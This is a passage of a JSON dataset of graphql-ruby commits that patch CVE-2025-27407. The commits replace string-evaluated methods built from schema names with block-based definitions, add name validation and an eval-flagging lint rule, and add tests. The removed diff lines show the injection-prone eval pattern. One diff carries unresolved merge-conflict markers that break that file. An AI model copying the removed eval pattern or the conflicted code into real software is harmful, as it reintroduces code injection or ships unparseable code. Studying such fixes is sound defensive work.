       \"ofType\" => nil\n+                      },\n+                      \"defaultValue\" => nil\n+                    }\n+                  ],\n+                }\n+              ]\n+            }\n+          ]\n+        }\n+      }\n+    }\n+    err = assert_raises GraphQL::InvalidNameError do\n+      GraphQL::Schema.from_introspection(json)\n+    end\n+\n+    assert_includes err.message, \"something-wrong\"\n+  end\n+\n+  it \"validates field names\" do\n+    json = {\n+      \"data\" => {\n+        \"__schema\" => {\n+          \"queryType\" => {\n+            \"name\" => \"Query\"\n+          },\n+          \"mutationType\" => nil,\n+          \"subscriptionType\" => nil,\n+          \"types\" => [\n+            {\n+              \"kind\" => \"OBJECT\",\n+              \"name\" => \"Query\",\n+              \"description\" => nil,\n+              \"fields\" => [\n+                {\n+                  \"name\" => \"bad.int\",\n+                  \"description\" => nil,\n+                  \"type\" => {\n+                    \"kind\" => \"SCALAR\",\n+                    \"name\" => \"Int\",\n+                    \"ofType\" => nil,\n+                  },\n+                  \"args\" => [],\n+                }\n+              ]\n+            }\n+          ]\n+        }\n+      }\n+    }\n+    err = assert_raises GraphQL::InvalidNameError do\n+      GraphQL::Schema.from_introspection(json)\n+    end\n+\n+    assert_includes err.message, \"bad.int\"\n+  end\n+\n+  it \"validates input object argument names\" do\n+    json = {\n+      \"data\" => {\n+        \"__schema\" => {\n+          \"queryType\" => {\n+            \"name\" => \"Query\"\n+          },\n+          \"mutationType\" => nil,\n+          \"subscriptionType\" => nil,\n+          \"types\" => [\n+            {\n+              \"kind\" => \"OBJECT\",\n+              \"name\" => \"Query\",\n+              \"description\" => nil,\n+              \"fields\" => [\n+                {\n+                  \"name\" => \"int\",\n+                  \"description\" => nil,\n+                  \"type\" => {\n+                    \"kind\" => \"SCALAR\",\n+                    \"name\" => \"Int\",\n+                    \"ofType\" => nil,\n+                  },\n+                  \"args\" => [\n+                    {\n+                      \"name\" => \"inputObject\",\n+                      \"description\" => nil,\n+                      \"type\" => {\n+                        \"kind\" => \"INPUT_OBJECT\",\n+                        \"name\" => \"SomeInputObject\",\n+                        \"ofType\" => nil\n+                      },\n+                      \"defaultValue\" => nil\n+                    }\n+                  ],\n+                }\n+              ]\n+            },\n+            {\n+              \"kind\" => \"INPUT_OBJECT\",\n+              \"name\" => \"SomeInputObject\",\n+              \"description\" => nil,\n+              \"inputFields\" => [\n+                {\n+                  \"name\"=>\"bad, input\",\n+                  \"type\"=> { \"kind\" => \"SCALAR\", \"name\" => \"String\"},\n+                  \"defaultValue\"=> nil,\n+                  \"description\" => nil,\n+                },\n+              ]\n+            }\n+          ]\n+        }\n+      }\n+    }\n+    err = assert_raises GraphQL::InvalidNameError do\n+      GraphQL::Schema.from_introspection(json)\n+    end\n+\n+    assert_includes err.message, \"bad, input\"\n+  end\n end\n```",
                "url": "https://github.com/rmosolgo/graphql-ruby/commit/d0963289e0dab4ea893bbecf12bb7d89294957bb"
            },
            {
                "content": "Merge commit from fork\n\n[2.1] fix CVE 2025 27407\n\nFilename: .rubocop.yml:\n```\n@@ -1,5 +1,6 @@\nrequire:\n   - ./cop/development/none_without_block_cop\n+  - ./cop/development/no_eval_cop\n   - ./cop/development/no_focus_cop\n   - ./lib/graphql/rubocop/graphql/default_null_true\n   - ./lib/graphql/rubocop/graphql/default_required_true\n\n@@ -51,6 +52,10 @@\nDevelopment/NoneWithoutBlockCop:\n     - \"lib/**/*\"\n     - \"spec/**/*\"\n \n+Development/NoEvalCop:\n+  Include:\n+    - \"lib/**/*\"\n+\n Development/NoFocusCop:\n   Include:\n     - \"spec/**/*\"\n```\n\nFilename: benchmark/run.rb:\n```\n@@ -110,12 +110,16 @@\ndef self.build_large_schema\n         end\n \n         obj_ts = 100.times.map do |n|\n+          input_obj_t = Class.new(GraphQL::Schema::InputObject) do\n+            graphql_name(\"Input#{n}\")\n+            argument :arg, String\n+          end\n           obj_t = Class.new(GraphQL::Schema::Object) do\n             graphql_name(\"Object#{n}\")\n             implements(*int_ts)\n             20.times do |n2|\n               field :\"field#{n2}\", String do\n-                argument :arg, String\n+                argument :input, input_obj_t\n               end\n \n             end\n\n@@ -152,8 +156,9 @@\ndef self.profile_boot\n     end\n     StackProf::Report.new(result).print_text\n \n+    retained_schema = nil\n     report = MemoryProfiler.report do\n-      build_large_schema\n+      retained_schema = build_large_schema\n     end\n \n     report.pretty_print\n```\n\nFilename: cop/development/no_eval_cop.rb:\n```\n@@ -0,0 +1,18 @@\n+# frozen_string_literal: true\n+require 'rubocop'\n+\n+module Cop\n+  module Development\n+    class NoEvalCop < RuboCop::Cop::Base\n+      MSG_TEMPLATE = \"Don't use `%{eval_method_name}` which accepts strings and may result evaluating unexpected code. Use `%{exec_method_name}` instead, and pass a block.\"\n+\n+      def on_send(node)\n+        case node.method_name\n+        when :module_eval, :class_eval, :instance_eval\n+          message = MSG_TEMPLATE % { eval_method_name: node.method_name, exec_method_name: node.method_name.to_s.sub(\"eval\", \"exec\").to_sym }\n+          add_offense node, message: message\n+        end\n+      end\n+    end\n+  end\n+end\n```\n\nFilename: lib/graphql/language/nodes.rb:\n```\n@@ -138,6 +138,8 @@\ndef merge!(new_options)\n         end\n \n         class << self\n+          # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n           # Add a default `#visit_method` and `#children_method_name` using the class name\n           def inherited(child_class)\n             super\n\n@@ -296,6 +298,7 @@\ndef self.from_a(filename, line, col, #{(scalar_method_names + @children_methods.\n               RUBY\n             end\n           end\n+          # rubocop:enable Development/NoEvalCop\n         end\n       end\n```\n\nFilename: lib/graphql/language/static_visitor.rb:\n```\n@@ -22,39 +22,6 @@\ndef visit\n         end\n       end\n \n-      # We don't use `alias` here because it breaks `super`\n-      def self.make_visit_methods(ast_node_class)\n-        node_method = ast_node_class.visit_method\n-        children_of_type = ast_node_class.children_of_type\n-        child_visit_method = :\"#{node_method}_children\"\n-\n-        class_eval(<<-RUBY, __FILE__, __LINE__ + 1)\n-          # The default implementation for visiting an AST node.\n-          # It doesn't _do_ anything, but it continues to visiting the node's children.\n-          # To customize this hook, override one of its make_visit_methods (or the base method?)\n-          # in your subclasses.\n-          #\n-          # @param node [GraphQL::Language::Nodes::AbstractNode] the node being visited\n-          # @param parent [GraphQL::Language::Nodes::AbstractNode, nil] the previously-visited node, or `nil` if this is the root node.\n-          # @return [void]\n-          def #{node_method}(node, parent)\n-            #{\n-              if method_defined?(child_visit_method)\n-                \"#{child_visit_method}(node)\"\n-              elsif children_of_type\n-                children_of_type.map do |child_accessor, child_class|\n-                  \"node.#{child_accessor}.each do |child_node|\n-                    #{child_class.visit_method}(child_node, node)\n-                  end\"\n-                end.join(\"\\n\")\n-              else\n-                \"\"\n-              end\n-            }\n-          end\n-        RUBY\n-      end\n-\n       def on_document_children(document_node)\n         document_node.children.each do |child_node|\n           visit_method = child_node.visit_method\n\n@@ -123,6 +90,41 @@\ndef on_argument_children(new_node)\n         end\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n+      # We don't use `alias` here because it breaks `super`\n+      def self.make_visit_methods(ast_node_class)\n+        node_method = ast_node_class.visit_method\n+        children_of_type = ast_node_class.children_of_type\n+        child_visit_method = :\"#{node_method}_children\"\n+\n+        class_eval(<<-RUBY, __FILE__, __LINE__ + 1)\n+          # The default implementation for visiting an AST node.\n+          # It doesn't _do_ anything, but it continues to visiting the node's children.\n+          # To customize this hook, override one of its make_visit_methods (or the base method?)\n+          # in your subclasses.\n+          #\n+          # @param node [GraphQL::Language::Nodes::AbstractNode] the node being visited\n+          # @param parent [GraphQL::Language::Nodes::AbstractNode, nil] the previously-visited node, or `nil` if this is the root node.\n+          # @return [void]\n+          def #{node_method}(node, parent)\n+            #{\n+              if method_defined?(child_visit_method)\n+                \"#{child_visit_method}(node)\"\n+              elsif children_of_type\n+                children_of_type.map do |child_accessor, child_class|\n+                  \"node.#{child_accessor}.each do |child_node|\n+                    #{child_class.visit_method}(child_node, node)\n+                  end\"\n+                end.join(\"\\n\")\n+              else\n+                \"\"\n+              end\n+            }\n+          end\n+        RUBY\n+      end\n+\n       [\n         Language::Nodes::Argument,\n         Language::Nodes::Directive,\n\n@@ -162,6 +164,8 @@\ndef on_argument_children(new_node)\n       ].each do |ast_node_class|\n         make_visit_methods(ast_node_class)\n       end\n+\n+      # rubocop:disable Development/NoEvalCop\n     end\n   end\n end\n```\n\nFilename: lib/graphql/language/visitor.rb:\n```\n@@ -61,61 +61,6 @@\ndef visit\n         end\n       end\n \n-      # We don't use `alias` here because it breaks `super`\n-      def self.make_visit_methods(ast_node_class)\n-        node_method = ast_node_class.visit_method\n-        children_of_type = ast_node_class.children_of_type\n-        child_visit_method = :\"#{node_method}_children\"\n-\n-        class_eval(<<-RUBY, __FILE__, __LINE__ + 1)\n-          # The default implementation for visiting an AST node.\n-          # It doesn't _do_ anything, but it continues to visiting the node's children.\n-          # To customize this hook, override one of its make_visit_methods (or the base method?)\n-          # in your subclasses.\n-          #\n-          # @param node [GraphQL::Language::Nodes::AbstractNode] the node being visited\n-          # @param parent [GraphQL::Language::Nodes::AbstractNode, nil] the previously-visited node, or `nil` if this is the root node.\n-          # @return [Array, nil] If there were modifications, it returns an array of new nodes, otherwise, it returns `nil`.\n-          def #{node_method}(node, parent)\n-            if node.equal?(DELETE_NODE)\n-              # This might be passed to `super(DELETE_NODE, ...)`\n-              # by a user hook, don't want to keep visiting in that case.\n-              [node, parent]\n-            else\n-              new_node = node\n-              #{\n-                if method_defined?(child_visit_method)\n-                  \"new_node = #{child_visit_method}(new_node)\"\n-                elsif children_of_type\n-                  children_of_type.map do |child_accessor, child_class|\n-                    \"node.#{child_accessor}.each do |child_node|\n-                      new_child_and_node = #{child_class.visit_method}_with_modifications(child_node, new_node)\n-                      # Reassign `node` in case the child hook makes a modification\n-                      if new_child_and_node.is_a?(Array)\n-                        new_node = new_child_and_node[1]\n-                      end\n-                    end\"\n-                  end.join(\"\\n\")\n-                else\n-                  \"\"\n-                end\n-              }\n-\n-              if new_node.equal?(node)\n-                [node, parent]\n-              else\n-                [new_node, parent]\n-              end\n-            end\n-          end\n-\n-          def #{node_method}_with_modifications(node, parent)\n-            new_node_and_new_parent = #{node_method}(node, parent)\n-            apply_modifications(node, parent, new_node_and_new_parent)\n-          end\n-        RUBY\n-      end\n-\n       def on_document_children(document_node)\n         new_node = document_node\n         document_node.children.each do |child_node|\n\n@@ -216,6 +161,63 @@\ndef on_argument_children(new_node)\n         new_node\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n+      # We don't use `alias` here because it breaks `super`\n+      def self.make_visit_methods(ast_node_class)\n+        node_method = ast_node_class.visit_method\n+        children_of_type = ast_node_class.children_of_type\n+        child_visit_method = :\"#{node_method}_children\"\n+\n+        class_eval(<<-RUBY, __FILE__, __LINE__ + 1)\n+          # The default implementation for visiting an AST node.\n+          # It doesn't _do_ anything, but it continues to visiting the node's children.\n+          # To customize this hook, override one of its make_visit_methods (or the base method?)\n+          # in your subclasses.\n+          #\n+          # @param node [GraphQL::Language::Nodes::AbstractNode] the node being visited\n+          # @param parent [GraphQL::Language::Nodes::AbstractNode, nil] the previously-visited node, or `nil` if this is the root node.\n+          # @return [Array, nil] If there were modifications, it returns an array of new nodes, otherwise, it returns `nil`.\n+          def #{node_method}(node, parent)\n+            if node.equal?(DELETE_NODE)\n+              # This might be passed to `super(DELETE_NODE, ...)`\n+              # by a user hook, don't want to keep visiting in that case.\n+              [node, parent]\n+            else\n+              new_node = node\n+              #{\n+                if method_defined?(child_visit_method)\n+                  \"new_node = #{child_visit_method}(new_node)\"\n+                elsif children_of_type\n+                  children_of_type.map do |child_accessor, child_class|\n+                    \"node.#{child_accessor}.each do |child_node|\n+                      new_child_and_node = #{child_class.visit_method}_with_modifications(child_node, new_node)\n+                      # Reassign `node` in case the child hook makes a modification\n+                      if new_child_and_node.is_a?(Array)\n+                        new_node = new_child_and_node[1]\n+                      end\n+                    end\"\n+                  end.join(\"\\n\")\n+                else\n+                  \"\"\n+                end\n+              }\n+\n+              if new_node.equal?(node)\n+                [node, parent]\n+              else\n+                [new_node, parent]\n+              end\n+            end\n+          end\n+\n+          def #{node_method}_with_modifications(node, parent)\n+            new_node_and_new_parent = #{node_method}(node, parent)\n+            apply_modifications(node, parent, new_node_and_new_parent)\n+          end\n+        RUBY\n+      end\n+\n       [\n         Language::Nodes::Argument,\n         Language::Nodes::Directive,\n\n@@ -256,6 +258,8 @@\ndef on_argument_children(new_node)\n         make_visit_methods(ast_node_class)\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       private\n \n       def apply_modifications(node, parent, new_node_and_new_parent)\n```\n\nFilename: lib/graphql/schema/argument.rb:\n```\n@@ -53,6 +53,7 @@\ndef from_resolver?\n       def initialize(arg_name = nil, type_expr = nil, desc = nil, required: true, type: nil, name: nil, loads: nil, description: nil, ast_node: nil, default_value: NOT_CONFIGURED, as: nil, from_resolver: false, camelize: true, prepare: nil, owner:, validates: nil, directives: nil, deprecation_reason: nil, replace_null_with_default: false, &definition_block)\n         arg_name ||= name\n         @name = -(camelize ? Member::BuildType.camelize(arg_name.to_s) : arg_name.to_s)\n+        NameValidator.validate!(@name)\n         @type_expr = type_expr || type\n         @description = desc || description\n         @null = required != true\n\n@@ -88,11 +89,8 @@\ndef initialize(arg_name = nil, type_expr = nil, desc = nil, required: true, type\n         end\n \n         if definition_block\n-          if definition_block.arity == 1\n-            instance_exec(self, &definition_block)\n-          else\n-            instance_eval(&definition_block)\n-          end\n+          # `self` will still be self, it will also be the first argument to the block:\n+          instance_exec(self, &definition_block)\n         end\n       end\n```\n\nFilename: lib/graphql/schema/build_from_definition.rb:\n```\n@@ -451,17 +451,18 @@\ndef build_fields(owner, field_definitions, type_resolver, default_resolve:)\n \n             # Don't do this for interfaces\n             if default_resolve\n-              owner.class_eval <<-RUBY, __FILE__, __LINE__\n-                # frozen_string_literal: true\n-                def #{resolve_method_name}(**args)\n-                  field_instance = self.class.get_field(\"#{field_definition.name}\")\n-                  context.schema.definition_default_resolve.call(self.class, field_instance, object, args, context)\n-                end\n-              RUBY\n+              define_field_resolve_method(owner, resolve_method_name, field_definition.name)\n             end\n           end\n         end\n \n+        def define_field_resolve_method(owner, method_name, field_name)\n+          owner.define_method(method_name) { |**args|\n+            field_instance = self.class.get_field(field_name)\n+            context.schema.definition_default_resolve.call(self.class, field_instance, object, args, context)\n+          }\n+        end\n+\n         def build_resolve_type(lookup_hash, directives, missing_type_handler)\n           resolve_type_proc = nil\n           resolve_type_proc = ->(ast_node) {\n```\n\nFilename: lib/graphql/schema/directive.rb:\n```\n@@ -99,7 +99,7 @@\ndef repeatable(new_value)\n \n         def inherited(subclass)\n           super\n-          subclass.class_eval do\n+          subclass.class_exec do\n             @default_graphql_name ||= nil\n           end\n         end\n```\n\nFilename: lib/graphql/schema/enum_value.rb:\n```\n@@ -47,7 +47,7 @@\ndef initialize(graphql_name, desc = nil, owner:, ast_node: nil, directives: nil,\n         end\n \n         if block_given?\n-          instance_eval(&block)\n+          instance_exec(self, &block)\n         end\n       end\n```\n\nFilename: lib/graphql/schema/field.rb:\n```\n@@ -233,7 +233,7 @@\ndef initialize(type: nil, name: nil, owner: nil, null: nil, description: NOT_CON\n \n         @underscored_name = -Member::BuildType.underscore(name_s)\n         @name = -(camelize ? Member::BuildType.camelize(name_s) : name_s)\n-\n+        NameValidator.validate!(@name)\n         @description = description\n         @type = @owner_type = @own_validators = @own_directives = @own_arguments = @arguments_statically_coercible = nil # these will be prepared later if necessary\n```\n\nFilename: lib/graphql/schema/input_object.rb:\n```\n@@ -44,6 +44,19 @@\ndef to_hash\n         to_h\n       end\n \n+<<<<<<< HEAD\n+=======\n+      def deconstruct_keys(keys = nil)\n+        if keys.nil?\n+          @ruby_style_hash\n+        else\n+          new_h = {}\n+          keys.each { |k| @ruby_style_hash.key?(k) && new_h[k] = @ruby_style_hash[k] }\n+          new_h\n+        end\n+      end\n+\n+>>>>>>> d85e69690f (Disable development NoEvalCop for load-time eval calls)\n       def prepare\n         if @context\n           object = @context[:current_object]\n\n@@ -131,12 +144,7 @@\ndef argument(*args, **kwargs, &block)\n             end\n           end\n           # Add a method access\n-          method_name = argument_defn.keyword\n-          class_eval <<-RUBY, __FILE__, __LINE__\n-            def #{method_name}\n-              self[#{method_name.inspect}]\n-            end\n-          RUBY\n+          define_accessor_method(argument_defn.keyword)\n           argument_defn\n         end\n\n@@ -242,6 +250,13 @@\ndef coerce_result(value, ctx)\n \n           result\n         end\n+\n+        private\n+\n+        def define_accessor_method(method_name)\n+          define_method(method_name) { self[method_name] }\n+          alias_method(method_name, method_name)\n+        end\n       end\n \n       private\n```\n\nFilename: lib/graphql/schema/interface.rb:\n```\n@@ -29,7 +29,7 @@\ndef definition_methods(&block)\n             const_set(:DefinitionMethods, defn_methods_module)\n             extend(self::DefinitionMethods)\n           end\n-          self::DefinitionMethods.module_eval(&block)\n+          self::DefinitionMethods.module_exec(&block)\n         end\n \n         # @see {Schema::Warden} hides interfaces without visible implementations\n```\n\nFilename: lib/graphql/schema/member/has_directives.rb:\n```\n@@ -6,7 +6,7 @@\nclass Member\n       module HasDirectives\n         def self.extended(child_cls)\n           super\n-          child_cls.module_eval { self.own_directives = nil }\n+          child_cls.module_exec { self.own_directives = nil }\n         end\n \n         def inherited(child_cls)\n```\n\nFilename: lib/graphql/schema/member/has_fields.rb:\n```\n@@ -183,7 +183,7 @@\ndef self.extended(child_class)\n \n         def inherited(subclass)\n           super\n-          subclass.class_eval do\n+          subclass.class_exec do\n             @own_fields ||= nil\n             @field_class ||= nil\n           end\n```\n\nFilename: lib/graphql/schema/member/has_interfaces.rb:\n```\n@@ -133,7 +133,7 @@\ndef self.extended(child_class)\n \n         def inherited(subclass)\n           super\n-          subclass.class_eval do\n+          subclass.class_exec do\n             @own_interface_type_memberships ||= nil\n           end\n         end\n```\n\nFilename: lib/graphql/schema/member/scoped.rb:\n```\n@@ -30,7 +30,7 @@\ndef reauthorize_scoped_objects(new_value = nil)\n \n         def inherited(subclass)\n           super\n-          subclass.class_eval do\n+          subclass.class_exec do\n             @reauthorize_scoped_objects = nil\n           end\n         end\n```\n\nFilename: lib/graphql/schema/member/type_system_helpers.rb:\n```\n@@ -43,7 +43,7 @@\ndef kind\n         private\n \n         def inherited(subclass)\n-          subclass.class_eval do\n+          subclass.class_exec do\n             @to_non_null_type ||= nil\n             @to_list_type ||= nil\n           end\n```\n\nFilename: lib/graphql/tracing/appoptics_trace.rb:\n```\n@@ -28,6 +28,8 @@\ndef self.version\n         Gem::Version.new('1.0.0')\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       [\n         'lex',\n         'parse',\n\n@@ -55,6 +57,8 @@\ndef #{trace_method}(**data)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def execute_field(query:, field:, ast_node:, arguments:, object:)\n         return_type = field.type.unwrap\n         trace_field = if return_type.kind.scalar? || return_type.kind.enum?\n```\n\nFilename: lib/graphql/tracing/appsignal_trace.rb:\n```\n@@ -13,6 +13,8 @@\ndef initialize(set_action_name: false, **rest)\n         super\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         \"lex\" => \"lex.graphql\",\n         \"parse\" => \"parse.graphql\",\n\n@@ -43,6 +45,8 @@\ndef #{trace_method}(**data)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def platform_execute_field(platform_key)\n         Appsignal.instrument(platform_key) do\n           yield\n```\n\nFilename: lib/graphql/tracing/data_dog_trace.rb:\n```\n@@ -20,6 +20,8 @@\ndef initialize(tracer: nil, analytics_enabled: false, analytics_sample_rate: 1.0\n         super\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         'lex' => 'lex.graphql',\n         'parse' => 'parse.graphql',\n\n@@ -69,6 +71,8 @@\ndef #{trace_method}(**data)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def execute_field_span(span_key, query, field, ast_node, arguments, object)\n         return_type = field.type.unwrap\n         trace_field = if return_type.kind.scalar? || return_type.kind.enum?\n```\n\nFilename: lib/graphql/tracing/notifications_trace.rb:\n```\n@@ -16,6 +16,8 @@\ndef initialize(engine:, **rest)\n         super\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         \"lex\" => \"lex.graphql\",\n         \"parse\" => \"parse.graphql\",\n\n@@ -39,6 +41,8 @@\ndef #{trace_method}(**metadata, &blk)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       include PlatformTrace\n     end\n   end\n```\n\nFilename: lib/graphql/tracing/platform_trace.rb:\n```\n@@ -39,6 +39,9 @@\ndef self.included(child_class)\n           include(BaseKeyCache)\n         }\n         child_class.const_set(:KeyCache, key_methods_class)\n+\n+        # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n         [:execute_field, :execute_field_lazy].each do |field_trace_method|\n           if !child_class.method_defined?(field_trace_method)\n             child_class.module_eval <<-RUBY, __FILE__, __LINE__\n\n@@ -91,6 +94,8 @@\ndef #{rt_trace_method}(query:, type:, object:)\n               end\n             RUBY\n           end\n+\n+          # rubocop:enable Development/NoEvalCop\n         end\n       end\n```\n\nFilename: lib/graphql/tracing/prometheus_trace.rb:\n```\n@@ -13,6 +13,8 @@\ndef initialize(client: PrometheusExporter::Client.default, keys_whitelist: [\"exe\n         super(**rest)\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         'lex' => \"graphql.lex\",\n         'parse' => \"graphql.parse\",\n\n@@ -30,6 +32,8 @@\ndef #{trace_method}(**data, &block)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def platform_execute_field(platform_key, &block)\n         instrument_execution(platform_key, \"execute_field\", &block)\n       end\n```\n\nFilename: lib/graphql/tracing/scout_trace.rb:\n```\n@@ -16,6 +16,8 @@\ndef initialize(set_transaction_name: false, **_rest)\n         super\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         \"lex\" => \"lex.graphql\",\n         \"parse\" => \"parse.graphql\",\n\n@@ -45,6 +47,7 @@\ndef #{trace_method}(**data)\n         end\n         RUBY\n       end\n+      # rubocop:enable Development/NoEvalCop\n \n       def platform_execute_field(platform_key, &block)\n         self.class.instrument(\"GraphQL\", platform_key, INSTRUMENT_OPTS, &block)\n```\n\nFilename: lib/graphql/tracing/statsd_trace.rb:\n```\n@@ -11,6 +11,8 @@\ndef initialize(statsd:, **rest)\n         super(**rest)\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         'lex' => \"graphql.lex\",\n         'parse' => \"graphql.parse\",\n\n@@ -30,6 +32,8 @@\ndef #{trace_method}(**data)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def platform_execute_field(platform_key, &block)\n         @statsd.time(platform_key, &block)\n       end\n```\n\nFilename: lib/graphql/types/relay/connection_behaviors.rb:\n```\n@@ -13,7 +13,7 @@\ndef self.included(child_class)\n           child_class.node_nullable(true)\n           child_class.edges_nullable(true)\n           child_class.edge_nullable(true)\n-          child_class.module_eval {\n+          child_class.module_exec {\n             self.edge_type = nil\n             self.node_type = nil\n             self.edge_class = nil\n```\n\nFilename: lib/graphql/types/relay/edge_behaviors.rb:\n```\n@@ -8,7 +8,7 @@\ndef self.included(child_class)\n           child_class.description(\"An edge in a connection.\")\n           child_class.field(:cursor, String, null: false, description: \"A cursor for use in pagination.\")\n           child_class.extend(ClassMethods)\n-          child_class.class_eval { self.node_type = nil }\n+          child_class.class_exec { self.node_type = nil }\n           child_class.node_nullable(true)\n         end\n```\n\nFilename: lib/graphql/version.rb:\n```\n@@ -1,4 +1,4 @@\n# frozen_string_literal: true\n module GraphQL\n-  VERSION = \"2.1.13\"\n+  VERSION = \"2.1.14\"\n end\n```\n\nFilename: spec/graphql/schema/loader_spec.rb:\n```\n@@ -398,4 +398,153 @@\ndef assert_deep_equal(expected_type, actual_type)\n       assert_equal arg.default_value, { 'id' => nil, 'int' => nil, 'float' => nil, 'enum' => nil, 'sub' => nil, 'bool' => nil, 'bigint' => nil }\n     end\n   end\n+\n+  it \"validates field argument names\" do\n+    json = {\n+      \"data\" => {\n+        \"__schema\" => {\n+          \"queryType\" => {\n+            \"name\" => \"Query\"\n+          },\n+          \"mutationType\" => nil,\n+          \"subscriptionType\" => nil,\n+          \"types\" => [\n+            {\n+              \"kind\" => \"OBJECT\",\n+              \"name\" => \"Query\",\n+              \"description\" => nil,\n+              \"fields\" => [\n+                {\n+                  \"name\" => \"int\",\n+                  \"description\" => nil,\n+                  \"type\" => {\n+                    \"kind\" => \"SCALAR\",\n+                    \"name\" => \"Int\",\n+                    \"ofType\" => nil,\n+                  },\n+                  \"args\" => [\n+                    {\n+                      \"name\" => \"something-wrong\",\n+                      \"description\" => nil,\n+                      \"type\" => {\n+                        \"kind\" => \"SCALAR\",\n+                        \"name\" => \"Int\",\n+                        \"ofType\" => nil\n+                      },\n+                      \"defaultValue\" => nil\n+                    }\n+                  ],\n+                }\n+              ]\n+            }\n+          ]\n+        }\n+      }\n+    }\n+    err = assert_raises GraphQL::InvalidNameError do\n+      GraphQL::Schema.from_introspection(json)\n+    end\n+\n+    assert_includes err.message, \"something-wrong\"\n+  end\n+\n+  it \"validates field names\" do\n+    json = {\n+      \"data\" => {\n+        \"__schema\" => {\n+          \"queryType\" => {\n+            \"name\" => \"Query\"\n+          },\n+          \"mutationType\" => nil,\n+          \"subscriptionType\" => nil,\n+          \"types\" => [\n+            {\n+              \"kind\" => \"OBJECT\",\n+              \"name\" => \"Query\",\n+              \"description\" => nil,\n+              \"fields\" => [\n+                {\n+                  \"name\" => \"bad.int\",\n+                  \"description\" => nil,\n+                  \"type\" => {\n+                    \"kind\" => \"SCALAR\",\n+                    \"name\" => \"Int\",\n+                    \"ofType\" => nil,\n+                  },\n+                  \"args\" => [],\n+                }\n+              ]\n+            }\n+          ]\n+        }\n+      }\n+    }\n+    err = assert_raises GraphQL::InvalidNameError do\n+      GraphQL::Schema.from_introspection(json)\n+    end\n+\n+    assert_includes err.message, \"bad.int\"\n+  end\n+\n+  it \"validates input object argument names\" do\n+    json = {\n+      \"data\" => {\n+        \"__schema\" => {\n+          \"queryType\" => {\n+            \"name\" => \"Query\"\n+          },\n+          \"mutationType\" => nil,\n+          \"subscriptionType\" => nil,\n+          \"types\" => [\n+            {\n+              \"kind\" => \"OBJECT\",\n+              \"name\" => \"Query\",\n+              \"description\" => nil,\n+              \"fields\" => [\n+                {\n+                  \"name\" => \"int\",\n+                  \"description\" => nil,\n+                  \"type\" => {\n+                    \"kind\" => \"SCALAR\",\n+                    \"name\" => \"Int\",\n+                    \"ofType\" => nil,\n+                  },\n+                  \"args\" => [\n+                    {\n+                      \"name\" => \"inputObject\",\n+                      \"description\" => nil,\n+                      \"type\" => {\n+                        \"kind\" => \"INPUT_OBJECT\",\n+                        \"name\" => \"SomeInputObject\",\n+                        \"ofType\" => nil\n+                      },\n+                      \"defaultValue\" => nil\n+                    }\n+                  ],\n+                }\n+              ]\n+            },\n+            {\n+              \"kind\" => \"INPUT_OBJECT\",\n+              \"name\" => \"SomeInputObject\",\n+              \"description\" => nil,\n+              \"inputFields\" => [\n+                {\n+                  \"name\"=>\"bad, input\",\n+                  \"type\"=> { \"kind\" => \"SCALAR\", \"name\" => \"String\"},\n+                  \"defaultValue\"=> nil,\n+                  \"description\" => nil,\n+                },\n+              ]\n+            }\n+          ]\n+        }\n+      }\n+    }\n+    err = assert_raises GraphQL::InvalidNameError do\n+      GraphQL::Schema.from_introspection(json)\n+    end\n+\n+    assert_includes err.message, \"bad, input\"\n+  end\n end\n```",
                "url": "https://github.com/rmosolgo/graphql-ruby/commit/d1117ae0361d9ed67e0795b07f5c3e98e62f3c7c"
            },
            {
                "content": "Merge commit from fork\n\n[2.3] fix CVE 2025 27407\n\nFilename: .rubocop.yml:\n```\n@@ -1,5 +1,6 @@\nrequire:\n   - ./cop/development/none_without_block_cop\n+  - ./cop/development/no_eval_cop\n   - ./cop/development/no_focus_cop\n   - ./lib/graphql/rubocop/graphql/default_null_true\n   - ./lib/graphql/rubocop/graphql/default_required_true\n\n@@ -51,6 +52,10 @@\nDevelopment/NoneWithoutBlockCop:\n     - \"lib/**/*\"\n     - \"spec/**/*\"\n \n+Development/NoEvalCop:\n+  Include:\n+    - \"lib/**/*\"\n+\n Development/NoFocusCop:\n   Include:\n     - \"spec/**/*\"\n```\n\nFilename: benchmark/run.rb:\n```\n@@ -110,12 +110,16 @@\ndef self.build_large_schema\n         end\n \n         obj_ts = 100.times.map do |n|\n+          input_obj_t = Class.new(GraphQL::Schema::InputObject) do\n+            graphql_name(\"Input#{n}\")\n+            argument :arg, String\n+          end\n           obj_t = Class.new(GraphQL::Schema::Object) do\n             graphql_name(\"Object#{n}\")\n             implements(*int_ts)\n             20.times do |n2|\n               field :\"field#{n2}\", String do\n-                argument :arg, String\n+                argument :input, input_obj_t\n               end\n \n             end\n\n@@ -152,8 +156,9 @@\ndef self.profile_boot\n     end\n     StackProf::Report.new(result).print_text\n \n+    retained_schema = nil\n     report = MemoryProfiler.report do\n-      build_large_schema\n+      retained_schema = build_large_schema\n     end\n \n     report.pretty_print\n```\n\nFilename: cop/development/no_eval_cop.rb:\n```\n@@ -0,0 +1,18 @@\n+# frozen_string_literal: true\n+require 'rubocop'\n+\n+module Cop\n+  module Development\n+    class NoEvalCop < RuboCop::Cop::Base\n+      